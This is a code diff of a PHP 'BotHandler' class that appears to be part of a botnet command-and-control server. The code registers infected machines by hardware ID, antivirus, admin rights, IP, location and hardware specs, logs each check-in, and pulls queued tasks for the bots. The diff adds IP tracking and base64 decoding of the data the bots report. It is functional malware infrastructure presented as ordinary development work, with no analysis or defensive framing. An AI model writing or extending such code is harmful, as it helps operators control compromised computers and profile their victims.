@@ -85,7 +85,8 @@ class BotHandler
             }
 
 
-
+//var_dump($postbot);
+  //          die();
 
 
 
@@ -100,8 +101,8 @@ class BotHandler
 
 
 
-                $statement = $GLOBALS["pdo"]->prepare("UPDATE bots SET lastresponse = CURRENT_TIMESTAMP() WHERE hwid = ?");
-                $statement->execute(array($postbot["hwid"]));
+                $statement = $GLOBALS["pdo"]->prepare("UPDATE bots SET lastresponse = CURRENT_TIMESTAMP(), ip = ?  WHERE hwid = ?");
+                $statement->execute(array($ip,$postbot["hwid"]));
 
 
                 $cmds = $GLOBALS["pdo"]->query("SELECT * FROM tasks ORDER BY id");
@@ -157,7 +158,7 @@ class BotHandler
             } else {
                 $statement = $GLOBALS["pdo"]->prepare("INSERT INTO bots (antivirus, hwid, computrername, country, netframework2, netframework3, netframework35, netframework4, latitude, longitude, countryName, ram, gpu, cpu, isadmin, architecture, ip, operingsystem, version) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
                 if (!empty($postbot["antivirus"])) {
-                    $avcheck = $postbot["antivirus"];
+                    $avcheck = base64_decode($postbot["antivirus"]);
                 } else {
                     $avcheck = "none";
                 }
@@ -176,12 +177,12 @@ class BotHandler
                     $countryLongitude,
                     $countryName,
                     $postbot["installedRam"],
-                    $postbot["gpuName"],
-                    $postbot["cpuName"],
+                    base64_decode($postbot["gpuName"]),
+                    base64_decode($postbot["cpuName"]),
                     $postbot["aornot"],
-                    $postbot["prcessorArchitecture"],
+                    base64_decode($postbot["arch"]),
                     $ip,
-                    $postbot["operingsystem"],
+                    base64_decode($postbot["operingsystem"]),
                     $postbot["botversion"]
                 ));
             }
